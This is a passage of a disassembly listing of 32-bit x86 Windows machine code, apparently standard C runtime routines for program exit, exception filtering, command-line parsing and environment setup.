  4245f7:	mov    eax,DWORD PTR [ebp-0x14]
  4245fa:	mov    ecx,DWORD PTR [eax]
  4245fc:	mov    ecx,DWORD PTR [ecx]
  4245fe:	mov    DWORD PTR [ebp-0x70],ecx
  424601:	push   eax
  424602:	push   ecx
  424603:	call   0x42499b
  424608:	pop    ecx
  424609:	pop    ecx
  42460a:	ret    
  42460b:	mov    esp,DWORD PTR [ebp-0x18]
  42460e:	mov    edi,DWORD PTR [ebp-0x70]
  424611:	cmp    DWORD PTR [ebp-0x1c],0x0
  424615:	jne    0x42461d
  424617:	push   edi
  424618:	call   0x4247bc
  42461d:	call   0x4247dc
  424622:	or     DWORD PTR [ebp-0x4],0xffffffff
  424626:	mov    eax,edi
  424628:	lea    esp,[ebp-0x7c]
  42462b:	call   0x42538b
  424630:	ret    
  424631:	push   0x429244
  424636:	call   DWORD PTR ds:0x429024
  42463c:	test   eax,eax
  42463e:	je     0x424656
  424640:	push   0x429234
  424645:	push   eax
  424646:	call   DWORD PTR ds:0x429020
  42464c:	test   eax,eax
  42464e:	je     0x424656
  424650:	push   DWORD PTR [esp+0x4]
  424654:	call   eax
  424656:	push   DWORD PTR [esp+0x4]
  42465a:	call   DWORD PTR ds:0x42905c
  424660:	int3   
  424661:	push   0x8
  424663:	call   0x42550f
  424668:	pop    ecx
  424669:	ret    
  42466a:	push   0x8
  42466c:	call   0x42547b
  424671:	pop    ecx
  424672:	ret    
  424673:	mov    eax,ds:0x45e270
  424678:	test   eax,eax
  42467a:	je     0x42467e
  42467c:	call   eax
  42467e:	push   esi
  42467f:	push   edi
  424680:	mov    ecx,0x42b00c
  424685:	mov    edi,0x42b018
  42468a:	xor    eax,eax
  42468c:	cmp    ecx,edi
  42468e:	mov    esi,ecx
  424690:	jae    0x4246a9
  424692:	test   eax,eax
  424694:	jne    0x4246d5
  424696:	mov    ecx,DWORD PTR [esi]
  424698:	test   ecx,ecx
  42469a:	je     0x42469e
  42469c:	call   ecx
  42469e:	add    esi,0x4
  4246a1:	cmp    esi,edi
  4246a3:	jb     0x424692
  4246a5:	test   eax,eax
  4246a7:	jne    0x4246d5
  4246a9:	push   0x4251a1
  4246ae:	call   0x425620
  4246b3:	mov    esi,0x42b000
  4246b8:	mov    eax,esi
  4246ba:	mov    edi,0x42b008
  4246bf:	cmp    eax,edi
  4246c1:	pop    ecx
  4246c2:	jae    0x4246d3
  4246c4:	mov    eax,DWORD PTR [esi]
  4246c6:	test   eax,eax
  4246c8:	je     0x4246cc
  4246ca:	call   eax
  4246cc:	add    esi,0x4
  4246cf:	cmp    esi,edi
  4246d1:	jb     0x4246c4
  4246d3:	xor    eax,eax
  4246d5:	pop    edi
  4246d6:	pop    esi
  4246d7:	ret    
  4246d8:	push   ebp
  4246d9:	mov    ebp,esp
  4246db:	push   esi
  4246dc:	push   edi
  4246dd:	push   0x8
  4246df:	call   0x42550f
  4246e4:	xor    esi,esi
  4246e6:	inc    esi
  4246e7:	cmp    DWORD PTR ds:0x45db04,esi
  4246ed:	pop    ecx
  4246ee:	jne    0x424700
  4246f0:	push   DWORD PTR [ebp+0x8]
  4246f3:	call   DWORD PTR ds:0x429064
  4246f9:	push   eax
  4246fa:	call   DWORD PTR ds:0x429060
  424700:	cmp    DWORD PTR [ebp+0xc],0x0
  424704:	mov    al,BYTE PTR [ebp+0x10]
  424707:	mov    DWORD PTR ds:0x45db00,esi
  42470d:	mov    ds:0x45dafc,al
  424712:	jne    0x424766
  424714:	mov    ecx,DWORD PTR ds:0x45e268
  42471a:	test   ecx,ecx
  42471c:	je     0x424747
  42471e:	mov    eax,ds:0x45e264
  424723:	sub    eax,0x4
  424726:	cmp    eax,ecx
  424728:	jmp    0x424740
  42472a:	mov    eax,DWORD PTR [eax]
  42472c:	test   eax,eax
  42472e:	je     0x424732
  424730:	call   eax
  424732:	mov    eax,ds:0x45e264
  424737:	sub    eax,0x4
  42473a:	cmp    eax,DWORD PTR ds:0x45e268
  424740:	mov    ds:0x45e264,eax
  424745:	jae    0x42472a
  424747:	mov    eax,0x42b01c
  42474c:	mov    esi,0x42b020
  424751:	cmp    eax,esi
  424753:	mov    edi,eax
  424755:	jae    0x424766
  424757:	mov    eax,DWORD PTR [edi]
  424759:	test   eax,eax
  42475b:	je     0x42475f
  42475d:	call   eax
  42475f:	add    edi,0x4
  424762:	cmp    edi,esi
  424764:	jb     0x424757
  424766:	mov    eax,0x42b024
  42476b:	mov    esi,0x42b028
  424770:	cmp    eax,esi
  424772:	mov    edi,eax
  424774:	jae    0x424785
  424776:	mov    eax,DWORD PTR [edi]
  424778:	test   eax,eax
  42477a:	je     0x42477e
  42477c:	call   eax
  42477e:	add    edi,0x4
  424781:	cmp    edi,esi
  424783:	jb     0x424776
  424785:	cmp    DWORD PTR [ebp+0x10],0x0
  424789:	pop    edi
  42478a:	pop    esi
  42478b:	je     0x424796
  42478d:	push   0x8
  42478f:	call   0x42547b
  424794:	jmp    0x4247a8
  424796:	push   DWORD PTR [ebp+0x8]
  424799:	mov    DWORD PTR ds:0x45db04,0x1
  4247a3:	call   0x424631
  4247a8:	pop    ecx
  4247a9:	pop    ebp
  4247aa:	ret    
  4247ab:	push   0x0
  4247ad:	push   0x0
  4247af:	push   DWORD PTR [esp+0xc]
  4247b3:	call   0x4246d8
  4247b8:	add    esp,0xc
  4247bb:	ret    
  4247bc:	push   0x0
  4247be:	push   0x1
  4247c0:	push   DWORD PTR [esp+0xc]
  4247c4:	call   0x4246d8
  4247c9:	add    esp,0xc
  4247cc:	ret    
  4247cd:	push   0x1
  4247cf:	push   0x0
  4247d1:	push   0x0
  4247d3:	call   0x4246d8
  4247d8:	add    esp,0xc
  4247db:	ret    
  4247dc:	push   0x1
  4247de:	push   0x1
  4247e0:	push   0x0
  4247e2:	call   0x4246d8
  4247e7:	add    esp,0xc
  4247ea:	ret    
  4247eb:	push   ebp
  4247ec:	mov    ebp,esp
  4247ee:	sub    esp,0x10c
  4247f4:	mov    eax,ds:0x45d430
  4247f9:	xor    eax,DWORD PTR [ebp+0x4]
  4247fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4247ff:	push   ebx
  424800:	push   esi
  424801:	mov    DWORD PTR [ebp-0x4],eax
  424804:	xor    edx,edx
  424806:	push   edi
  424807:	xor    eax,eax
  424809:	cmp    ecx,DWORD PTR [eax*8+0x45d1c8]
  424810:	je     0x424818
  424812:	inc    eax
  424813:	cmp    eax,0x12
  424816:	jb     0x424809
  424818:	mov    esi,eax
  42481a:	shl    esi,0x3
  42481d:	cmp    ecx,DWORD PTR [esi+0x45d1c8]
  424823:	jne    0x42494c
  424829:	mov    eax,ds:0x45dabc
  42482e:	cmp    eax,0x1
  424831:	je     0x424927
  424837:	cmp    eax,edx
  424839:	jne    0x424848
  42483b:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424842:	je     0x424927
  424848:	cmp    ecx,0xfc
  42484e:	je     0x42494c
  424854:	push   0x104
  424859:	lea    eax,[ebp-0x10c]
  42485f:	push   eax
  424860:	push   edx
  424861:	mov    BYTE PTR [ebp-0x8],dl
  424864:	call   DWORD PTR ds:0x42906c
  42486a:	test   eax,eax
  42486c:	jne    0x424881
  42486e:	lea    eax,[ebp-0x10c]
  424874:	push   0x42959c
  424879:	push   eax
  42487a:	call   0x425730
  42487f:	pop    ecx
  424880:	pop    ecx
  424881:	lea    eax,[ebp-0x10c]
  424887:	push   eax
  424888:	lea    edi,[ebp-0x10c]
  42488e:	call   0x425960
  424893:	inc    eax
  424894:	cmp    eax,0x3c
  424897:	pop    ecx
  424898:	jbe    0x4248c3
  42489a:	lea    eax,[ebp-0x10c]
  4248a0:	push   eax
  4248a1:	call   0x425960
  4248a6:	mov    edi,eax
  4248a8:	lea    eax,[ebp-0x10c]
  4248ae:	sub    eax,0x3b
  4248b1:	push   0x3
  4248b3:	add    edi,eax
  4248b5:	push   0x429598
  4248ba:	push   edi
  4248bb:	call   0x425830
  4248c0:	add    esp,0x10
  4248c3:	push   edi
  4248c4:	call   0x425960
  4248c9:	push   DWORD PTR [esi+0x45d1cc]
  4248cf:	mov    ebx,eax
  4248d1:	call   0x425960
  4248d6:	lea    eax,[ebx+eax*1+0x1c]
  4248da:	pop    ecx
  4248db:	add    eax,0x3
  4248de:	pop    ecx
  4248df:	and    eax,0xfffffffc
  4248e2:	call   0x4253a0
  4248e7:	mov    ebx,esp
  4248e9:	push   0x42957c
  4248ee:	push   ebx
  4248ef:	call   0x425730
  4248f4:	push   edi
  4248f5:	push   ebx
  4248f6:	call   0x425740
  4248fb:	push   0x429578
  424900:	push   ebx
  424901:	call   0x425740
  424906:	push   DWORD PTR [esi+0x45d1cc]
  42490c:	push   ebx
  42490d:	call   0x425740
  424912:	push   0x12010
  424917:	push   0x429550
  42491c:	push   ebx
  42491d:	call   0x425632
  424922:	add    esp,0x2c
  424925:	jmp    0x42494c
  424927:	push   edx
  424928:	lea    eax,[ebp+0x8]
  42492b:	push   eax
  42492c:	lea    esi,[esi+0x45d1cc]
  424932:	push   DWORD PTR [esi]
  424934:	call   0x425960
  424939:	pop    ecx
  42493a:	push   eax
  42493b:	push   DWORD PTR [esi]
  42493d:	push   0xfffffff4
  42493f:	call   DWORD PTR ds:0x429068
  424945:	push   eax
  424946:	call   DWORD PTR ds:0x42902c
  42494c:	lea    esp,[ebp-0x118]
  424952:	mov    ecx,DWORD PTR [ebp-0x4]
  424955:	xor    ecx,DWORD PTR [ebp+0x4]
  424958:	call   0x425a1c
  42495d:	pop    edi
  42495e:	pop    esi
  42495f:	pop    ebx
  424960:	leave  
  424961:	ret    
  424962:	mov    eax,ds:0x45dabc
  424967:	cmp    eax,0x1
  42496a:	je     0x424979
  42496c:	test   eax,eax
  42496e:	jne    0x42499a
  424970:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424977:	jne    0x42499a
  424979:	push   0xfc
  42497e:	call   0x4247eb
  424983:	mov    eax,ds:0x45db08
  424988:	test   eax,eax
  42498a:	pop    ecx
  42498b:	je     0x42498f
  42498d:	call   eax
  42498f:	push   0xff
  424994:	call   0x4247eb
  424999:	pop    ecx
  42499a:	ret    
  42499b:	push   ebp
  42499c:	mov    ebp,esp
  42499e:	push   ecx
  42499f:	push   ebx
  4249a0:	push   esi
  4249a1:	push   edi
  4249a2:	call   0x425203
  4249a7:	mov    edi,DWORD PTR [ebp+0x8]
  4249aa:	mov    esi,eax
  4249ac:	mov    edx,DWORD PTR [esi+0x54]
  4249af:	mov    eax,ds:0x45d2dc
  4249b4:	mov    ecx,edx
  4249b6:	cmp    DWORD PTR [ecx],edi
  4249b8:	je     0x4249c7
  4249ba:	lea    ebx,[eax+eax*2]
  4249bd:	add    ecx,0xc
  4249c0:	lea    ebx,[edx+ebx*4]
  4249c3:	cmp    ecx,ebx
  4249c5:	jb     0x4249b6
  4249c7:	lea    eax,[eax+eax*2]
  4249ca:	lea    eax,[edx+eax*4]
  4249cd:	cmp    ecx,eax
  4249cf:	jae    0x4249d5
  4249d1:	cmp    DWORD PTR [ecx],edi
  4249d3:	je     0x4249d7
  4249d5:	xor    ecx,ecx
  4249d7:	test   ecx,ecx
  4249d9:	je     0x424af1
  4249df:	mov    ebx,DWORD PTR [ecx+0x8]
  4249e2:	test   ebx,ebx
  4249e4:	mov    DWORD PTR [ebp+0x8],ebx
  4249e7:	je     0x424af1
  4249ed:	cmp    ebx,0x5
  4249f0:	jne    0x4249fe
  4249f2:	and    DWORD PTR [ecx+0x8],0x0
  4249f6:	xor    eax,eax
  4249f8:	inc    eax
  4249f9:	jmp    0x424afa
  4249fe:	cmp    ebx,0x1
  424a01:	je     0x424aec
  424a07:	mov    eax,DWORD PTR [esi+0x58]
  424a0a:	mov    DWORD PTR [ebp-0x4],eax
  424a0d:	mov    eax,DWORD PTR [ebp+0xc]
  424a10:	mov    DWORD PTR [esi+0x58],eax
  424a13:	mov    eax,DWORD PTR [ecx+0x4]
  424a16:	cmp    eax,0x8
  424a19:	jne    0x424ade
  424a1f:	mov    edx,DWORD PTR ds:0x45d2d0
  424a25:	mov    eax,ds:0x45d2d4
  424a2a:	add    eax,edx
  424a2c:	cmp    edx,eax
  424a2e:	jge    0x424a57
  424a30:	lea    eax,[edx+edx*2]
  424a33:	shl    eax,0x2
  424a36:	mov    edi,DWORD PTR [esi+0x54]
  424a39:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424a3e:	mov    edi,DWORD PTR ds:0x45d2d0
  424a44:	mov    ebx,DWORD PTR ds:0x45d2d4
  424a4a:	inc    edx
  424a4b:	add    ebx,edi
  424a4d:	add    eax,0xc
  424a50:	cmp    edx,ebx
  424a52:	jl     0x424a36
  424a54:	mov    ebx,DWORD PTR [ebp+0x8]
  424a57:	mov    ecx,DWORD PTR [ecx]
  424a59:	cmp    ecx,0xc000008e
  424a5f:	mov    edi,DWORD PTR [esi+0x5c]
  424a62:	jne    0x424a6d
  424a64:	mov    DWORD PTR [esi+0x5c],0x83
  424a6b:	jmp    0x424ad1
  424a6d:	cmp    ecx,0xc0000090
  424a73:	jne    0x424a7e
  424a75:	mov    DWORD PTR [esi+0x5c],0x81
  424a7c:	jmp    0x424ad1
  424a7e:	cmp    ecx,0xc0000091
  424a84:	jne    0x424a8f
  424a86:	mov    DWORD PTR [esi+0x5c],0x84
  424a8d:	jmp    0x424ad1
  424a8f:	cmp    ecx,0xc0000093
  424a95:	jne    0x424aa0
  424a97:	mov    DWORD PTR [esi+0x5c],0x85
  424a9e:	jmp    0x424ad1
  424aa0:	cmp    ecx,0xc000008d
  424aa6:	jne    0x424ab1
  424aa8:	mov    DWORD PTR [esi+0x5c],0x82
  424aaf:	jmp    0x424ad1
  424ab1:	cmp    ecx,0xc000008f
  424ab7:	jne    0x424ac2
  424ab9:	mov    DWORD PTR [esi+0x5c],0x86
  424ac0:	jmp    0x424ad1
  424ac2:	cmp    ecx,0xc0000092
  424ac8:	jne    0x424ad1
  424aca:	mov    DWORD PTR [esi+0x5c],0x8a
  424ad1:	push   DWORD PTR [esi+0x5c]
  424ad4:	push   0x8
  424ad6:	call   ebx
  424ad8:	pop    ecx
  424ad9:	mov    DWORD PTR [esi+0x5c],edi
  424adc:	jmp    0x424ae5
  424ade:	and    DWORD PTR [ecx+0x8],0x0
  424ae2:	push   eax
  424ae3:	call   ebx
  424ae5:	mov    eax,DWORD PTR [ebp-0x4]
  424ae8:	pop    ecx
  424ae9:	mov    DWORD PTR [esi+0x58],eax
  424aec:	or     eax,0xffffffff
  424aef:	jmp    0x424afa
  424af1:	push   DWORD PTR [ebp+0xc]
  424af4:	call   DWORD PTR ds:0x429070
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	pop    ebx
  424afd:	leave  
  424afe:	ret    
  424aff:	cmp    DWORD PTR ds:0x45e26c,0x0
  424b06:	jne    0x424b0d
  424b08:	call   0x425f3c
  424b0d:	push   esi
  424b0e:	mov    esi,DWORD PTR ds:0x45e274
  424b14:	test   esi,esi
  424b16:	jne    0x424b1f
  424b18:	mov    esi,0x4295b3
  424b1d:	jmp    0x424b64
  424b1f:	mov    al,BYTE PTR [esi]
  424b21:	cmp    al,0x22
  424b23:	jne    0x424b4d
  424b25:	inc    esi
  424b26:	mov    al,BYTE PTR [esi]
  424b28:	cmp    al,0x22
  424b2a:	je     0x424b5d
  424b2c:	test   al,al
  424b2e:	je     0x424b46
  424b30:	movzx  eax,al
  424b33:	push   eax
  424b34:	call   0x425a5b
  424b39:	test   eax,eax
  424b3b:	pop    ecx
  424b3c:	je     0x424b3f
  424b3e:	inc    esi
  424b3f:	inc    esi
  424b40:	mov    al,BYTE PTR [esi]
  424b42:	cmp    al,0x22
  424b44:	jne    0x424b2c
  424b46:	cmp    BYTE PTR [esi],0x22
  424b49:	jne    0x424b5e
  424b4b:	jmp    0x424b5d
  424b4d:	cmp    al,0x20
  424b4f:	jbe    0x424b5e
  424b51:	inc    esi
  424b52:	cmp    BYTE PTR [esi],0x20
  424b55:	ja     0x424b51
  424b57:	jmp    0x424b5e
  424b59:	cmp    al,0x20
  424b5b:	ja     0x424b64
  424b5d:	inc    esi
  424b5e:	mov    al,BYTE PTR [esi]
  424b60:	test   al,al
  424b62:	jne    0x424b59
  424b64:	mov    eax,esi
  424b66:	pop    esi
  424b67:	ret    
  424b68:	push   ebx
  424b69:	xor    ebx,ebx
  424b6b:	cmp    DWORD PTR ds:0x45e26c,ebx
  424b71:	push   esi
  424b72:	push   edi
  424b73:	jne    0x424b7a
  424b75:	call   0x425f3c
  424b7a:	mov    esi,DWORD PTR ds:0x45dab4
  424b80:	xor    edi,edi
  424b82:	cmp    esi,ebx
  424b84:	jne    0x424b98
  424b86:	jmp    0x424bb8
  424b88:	cmp    al,0x3d
  424b8a:	je     0x424b8d
  424b8c:	inc    edi
  424b8d:	push   esi
  424b8e:	call   0x425960
  424b93:	pop    ecx
  424b94:	lea    esi,[esi+eax*1+0x1]
  424b98:	mov    al,BYTE PTR [esi]
  424b9a:	cmp    al,bl
  424b9c:	jne    0x424b88
  424b9e:	lea    eax,[edi*4+0x4]
  424ba5:	push   eax
  424ba6:	call   0x426072
  424bab:	mov    edi,eax
  424bad:	cmp    edi,ebx
  424baf:	pop    ecx
  424bb0:	mov    DWORD PTR ds:0x45dae4,edi
  424bb6:	jne    0x424bbd
  424bb8:	or     eax,0xffffffff
  424bbb:	jmp    0x424c15
  424bbd:	mov    esi,DWORD PTR ds:0x45dab4
  424bc3:	push   ebp
  424bc4:	jmp    0x424bf0
  424bc6:	push   esi
  424bc7:	call   0x425960
  424bcc:	mov    ebp,eax
  424bce:	inc    ebp
  424bcf:	cmp    BYTE PTR [esi],0x3d
  424bd2:	pop    ecx
  424bd3:	je     0x424bee
  424bd5:	push   ebp
  424bd6:	call   0x426072
  424bdb:	cmp    eax,ebx
  424bdd:	pop    ecx
  424bde:	mov    DWORD PTR [edi],eax
  424be0:	je     0x424c19
  424be2:	push   esi
  424be3:	push   eax
  424be4:	call   0x425730
  424be9:	pop    ecx
  424bea:	pop    ecx
  424beb:	add    edi,0x4
  424bee:	add    esi,ebp
  424bf0:	cmp    BYTE PTR [esi],bl
  424bf2:	jne    0x424bc6
  424bf4:	push   DWORD PTR ds:0x45dab4
  424bfa:	call   0x425f5a
  424bff:	mov    DWORD PTR ds:0x45dab4,ebx
  424c05:	mov    DWORD PTR [edi],ebx
  424c07:	mov    DWORD PTR ds:0x45e260,0x1
  424c11:	xor    eax,eax
  424c13:	pop    ecx
  424c14:	pop    ebp
  424c15:	pop    edi
  424c16:	pop    esi
  424c17:	pop    ebx
  424c18:	ret    
  424c19:	push   DWORD PTR ds:0x45dae4
  424c1f:	call   0x425f5a
  424c24:	mov    DWORD PTR ds:0x45dae4,ebx
  424c2a:	or     eax,0xffffffff
  424c2d:	jmp    0x424c13
  424c2f:	push   ebp
  424c30:	mov    ebp,esp
  424c32:	push   ecx
  424c33:	push   ebx
  424c34:	mov    ebx,DWORD PTR [ebp+0xc]
  424c37:	xor    edx,edx
  424c39:	cmp    DWORD PTR [ebp+0x8],edx
  424c3c:	push   edi
  424c3d:	mov    DWORD PTR [esi],edx
  424c3f:	mov    edi,ecx
  424c41:	mov    DWORD PTR [ebx],0x1
  424c47:	je     0x424c52
  424c49:	mov    ecx,DWORD PTR [ebp+0x8]
  424c4c:	add    DWORD PTR [ebp+0x8],0x4
  424c50:	mov    DWORD PTR [ecx],edi
  424c52:	cmp    BYTE PTR [eax],0x22
  424c55:	jne    0x424c65
  424c57:	xor    ecx,ecx
  424c59:	test   edx,edx
  424c5b:	sete   cl
  424c5e:	inc    eax
  424c5f:	mov    edx,ecx
  424c61:	mov    cl,0x22
  424c63:	jmp    0x424c92
  424c65:	inc    DWORD PTR [esi]
  424c67:	test   edi,edi
  424c69:	je     0x424c70
  424c6b:	mov    cl,BYTE PTR [eax]
  424c6d:	mov    BYTE PTR [edi],cl
  424c6f:	inc    edi
  424c70:	mov    cl,BYTE PTR [eax]
  424c72:	movzx  ebx,cl
  424c75:	inc    eax
  424c76:	test   BYTE PTR [ebx+0x45df21],0x4
  424c7d:	je     0x424c8b
  424c7f:	inc    DWORD PTR [esi]
  424c81:	test   edi,edi
  424c83:	je     0x424c8a
  424c85:	mov    bl,BYTE PTR [eax]
  424c87:	mov    BYTE PTR [edi],bl
  424c89:	inc    edi
  424c8a:	inc    eax
  424c8b:	test   cl,cl
  424c8d:	mov    ebx,DWORD PTR [ebp+0xc]
  424c90:	je     0x424cc4
  424c92:	test   edx,edx
  424c94:	jne    0x424c52
  424c96:	cmp    cl,0x20
  424c99:	je     0x424ca0
  424c9b:	cmp    cl,0x9
  424c9e:	jne    0x424c52
  424ca0:	test   edi,edi
  424ca2:	je     0x424ca8
  424ca4:	and    BYTE PTR [edi-0x1],0x0
  424ca8:	and    DWORD PTR [ebp-0x4],0x0
  424cac:	cmp    BYTE PTR [eax],0x0
  424caf:	je     0x424d8b
  424cb5:	mov    cl,BYTE PTR [eax]
  424cb7:	cmp    cl,0x20
  424cba:	je     0x424cc1
  424cbc:	cmp    cl,0x9
  424cbf:	jne    0x424cc7
  424cc1:	inc    eax
  424cc2:	jmp    0x424cb5
  424cc4:	dec    eax
  424cc5:	jmp    0x424ca8
  424cc7:	cmp    BYTE PTR [eax],0x0
  424cca:	je     0x424d8b
  424cd0:	cmp    DWORD PTR [ebp+0x8],0x0
  424cd4:	je     0x424cdf
  424cd6:	mov    ecx,DWORD PTR [ebp+0x8]
  424cd9:	add    DWORD PTR [ebp+0x8],0x4
  424cdd:	mov    DWORD PTR [ecx],edi
  424cdf:	inc    DWORD PTR [ebx]
  424ce1:	xor    ebx,ebx
  424ce3:	inc    ebx
  424ce4:	xor    edx,edx
  424ce6:	jmp    0x424cea
  424ce8:	inc    eax
  424ce9:	inc    edx
  424cea:	cmp    BYTE PTR [eax],0x5c
  424ced:	je     0x424ce8
  424cef:	cmp    BYTE PTR [eax],0x22
  424cf2:	jne    0x424d1a
  424cf4:	test   dl,0x1
  424cf7:	jne    0x424d18
  424cf9:	cmp    DWORD PTR [ebp-0x4],0x0
  424cfd:	je     0x424d0b
  424cff:	lea    ecx,[eax+0x1]
  424d02:	cmp    BYTE PTR [ecx],0x22
  424d05:	jne    0x424d0b
  424d07:	mov    eax,ecx
  424d09:	jmp    0x424d0d
  424d0b:	xor    ebx,ebx
  424d0d:	xor    ecx,ecx
  424d0f:	cmp    DWORD PTR [ebp-0x4],ecx
  424d12:	sete   cl
  424d15:	mov    DWORD PTR [ebp-0x4],ecx
  424d18:	shr    edx,1
  424d1a:	test   edx,edx
  424d1c:	je     0x424d2b
  424d1e:	test   edi,edi
  424d20:	je     0x424d26
  424d22:	mov    BYTE PTR [edi],0x5c
  424d25:	inc    edi
  424d26:	inc    DWORD PTR [esi]
  424d28:	dec    edx
  424d29:	jne    0x424d1e
  424d2b:	mov    cl,BYTE PTR [eax]
  424d2d:	test   cl,cl
  424d2f:	je     0x424d79
  424d31:	cmp    DWORD PTR [ebp-0x4],0x0
  424d35:	jne    0x424d41
  424d37:	cmp    cl,0x20
  424d3a:	je     0x424d79
  424d3c:	cmp    cl,0x9
  424d3f:	je     0x424d79
  424d41:	test   ebx,ebx
  424d43:	je     0x424d73
  424d45:	test   edi,edi
  424d47:	je     0x424d62
  424d49:	movzx  edx,cl
  424d4c:	test   BYTE PTR [edx+0x45df21],0x4
  424d53:	je     0x424d5b
  424d55:	mov    BYTE PTR [edi],cl
  424d57:	inc    edi
  424d58:	inc    eax
  424d59:	inc    DWORD PTR [esi]
  424d5b:	mov    cl,BYTE PTR [eax]
  424d5d:	mov    BYTE PTR [edi],cl
  424d5f:	inc    edi
  424d60:	jmp    0x424d71
  424d62:	movzx  ecx,cl
  424d65:	test   BYTE PTR [ecx+0x45df21],0x4
  424d6c:	je     0x424d71
  424d6e:	inc    eax
  424d6f:	inc    DWORD PTR [esi]
  424d71:	inc    DWORD PTR [esi]
  424d73:	inc    eax
  424d74:	jmp    0x424ce1
  424d79:	test   edi,edi
  424d7b:	je     0x424d81
  424d7d:	and    BYTE PTR [edi],0x0
  424d80:	inc    edi
  424d81:	inc    DWORD PTR [esi]
  424d83:	mov    ebx,DWORD PTR [ebp+0xc]
  424d86:	jmp    0x424cac
  424d8b:	mov    eax,DWORD PTR [ebp+0x8]
  424d8e:	test   eax,eax
  424d90:	je     0x424d95
  424d92:	and    DWORD PTR [eax],0x0
  424d95:	inc    DWORD PTR [ebx]
  424d97:	pop    edi
  424d98:	pop    ebx
  424d99:	leave  
  424d9a:	ret    
  424d9b:	push   ebp
  424d9c:	mov    ebp,esp
  424d9e:	push   ecx
  424d9f:	push   ecx
  424da0:	push   ebx
  424da1:	push   esi
  424da2:	push   edi
  424da3:	xor    edi,edi
  424da5:	cmp    DWORD PTR ds:0x45e26c,edi
  424dab:	jne    0x424db2
  424dad:	call   0x425f3c
  424db2:	and    BYTE PTR ds:0x45dc14,0x0
  424db9:	push   0x104
  424dbe:	mov    esi,0x45db10
  424dc3:	push   esi
  424dc4:	push   edi
  424dc5:	call   DWORD PTR ds:0x42906c
  424dcb:	mov    eax,ds:0x45e274
  424dd0:	cmp    eax,edi
  424dd2:	mov    DWORD PTR ds:0x45daf4,esi
  424dd8:	je     0x424de1
  424dda:	cmp    BYTE PTR [eax],0x0
  424ddd:	mov    ebx,eax
  424ddf:	jne    0x424de3
  424de1:	mov    ebx,esi
  424de3:	lea    eax,[ebp-0x4]
  424de6:	push   eax
  424de7:	push   edi
  424de8:	lea    esi,[ebp-0x8]
  424deb:	xor    ecx,ecx
  424ded:	mov    eax,ebx
  424def:	call   0x424c2f
  424df4:	mov    esi,DWORD PTR [ebp-0x4]
  424df7:	mov    eax,DWORD PTR [ebp-0x8]
  424dfa:	shl    esi,0x2
  424dfd:	add    eax,esi
  424dff:	push   eax
  424e00:	call   0x426072
  424e05:	mov    edi,eax
  424e07:	add    esp,0xc
  424e0a:	test   edi,edi
  424e0c:	jne    0x424e13
  424e0e:	or     eax,0xffffffff
  424e11:	jmp    0x424e38
  424e13:	lea    eax,[ebp-0x4]
  424e16:	push   eax
  424e17:	lea    ecx,[esi+edi*1]
  424e1a:	push   edi
  424e1b:	lea    esi,[ebp-0x8]
  424e1e:	mov    eax,ebx
  424e20:	call   0x424c2f
  424e25:	mov    eax,DWORD PTR [ebp-0x4]
  424e28:	dec    eax
  424e29:	pop    ecx
  424e2a:	mov    ds:0x45dad8,eax
  424e2f:	pop    ecx
  424e30:	mov    DWORD PTR ds:0x45dadc,edi
  424e36:	xor    eax,eax
  424e38:	pop    edi
  424e39:	pop    esi
  424e3a:	pop    ebx
  424e3b:	leave  
  424e3c:	ret    
  424e3d:	push   ecx
  424e3e:	push   ecx
  424e3f:	mov    eax,ds:0x45dc18
  424e44:	push   ebx
  424e45:	push   ebp
  424e46:	push   esi
  424e47:	push   edi
  424e48:	mov    edi,DWORD PTR ds:0x429084
  424e4e:	xor    ebx,ebx
  424e50:	xor    esi,esi
  424e52:	cmp    eax,ebx
  424e54:	push   0x2
  424e56:	pop    ebp
  424e57:	jne    0x424e86
  424e59:	call   edi
  424e5b:	mov    esi,eax
  424e5d:	cmp    esi,ebx
  424e5f:	je     0x424e6d
  424e61:	mov    DWORD PTR ds:0x45dc18,0x1
  424e6b:	jmp    0x424e8b
  424e6d:	call   DWORD PTR ds:0x429028
  424e73:	cmp    eax,0x78
  424e76:	jne    0x424e81
  424e78:	mov    eax,ebp
  424e7a:	mov    ds:0x45dc18,eax
  424e7f:	jmp    0x424e86
  424e81:	mov    eax,ds:0x45dc18
  424e86:	cmp    eax,0x1
  424e89:	jne    0x424f08
  424e8b:	cmp    esi,ebx
  424e8d:	jne    0x424e97
  424e8f:	call   edi
  424e91:	mov    esi,eax
  424e93:	cmp    esi,ebx
  424e95:	je     0x424f10
  424e97:	cmp    WORD PTR [esi],bx
  424e9a:	mov    eax,esi
  424e9c:	je     0x424eac
  424e9e:	add    eax,ebp
  424ea0:	cmp    WORD PTR [eax],bx
  424ea3:	jne    0x424e9e
  424ea5:	add    eax,ebp
  424ea7:	cmp    WORD PTR [eax],bx
  424eaa:	jne    0x424e9e
  424eac:	mov    edi,DWORD PTR ds:0x429080
  424eb2:	push   ebx
  424eb3:	push   ebx
  424eb4:	push   ebx
  424eb5:	sub    eax,esi
  424eb7:	push   ebx
  424eb8:	sar    eax,1
  424eba:	inc    eax
  424ebb:	push   eax
  424ebc:	push   esi
  424ebd:	push   ebx
  424ebe:	push   ebx
  424ebf:	mov    DWORD PTR [esp+0x34],eax
  424ec3:	call   edi
  424ec5:	mov    ebp,eax
  424ec7:	cmp    ebp,ebx
  424ec9:	je     0x424efd
  424ecb:	push   ebp
  424ecc:	call   0x426072
  424ed1:	cmp    eax,ebx
  424ed3:	pop    ecx
  424ed4:	mov    DWORD PTR [esp+0x10],eax
  424ed8:	je     0x424efd
  424eda:	push   ebx
  424edb:	push   ebx
  424edc:	push   ebp
  424edd:	push   eax
  424ede:	push   DWORD PTR [esp+0x24]
  424ee2:	push   esi
  424ee3:	push   ebx
  424ee4:	push   ebx
  424ee5:	call   edi
  424ee7:	test   eax,eax
  424ee9:	jne    0x424ef9
  424eeb:	push   DWORD PTR [esp+0x10]
  424eef:	call   0x425f5a
  424ef4:	pop    ecx
  424ef5:	mov    DWORD PTR [esp+0x10],ebx
  424ef9:	mov    ebx,DWORD PTR [esp+0x10]
  424efd:	push   esi
  424efe:	call   DWORD PTR ds:0x42907c
  424f04:	mov    eax,ebx
  424f06:	jmp    0x424f58
  424f08:	cmp    eax,ebp
  424f0a:	je     0x424f14
  424f0c:	cmp    eax,ebx
  424f0e:	je     0x424f14
  424f10:	xor    eax,eax
  424f12:	jmp    0x424f58
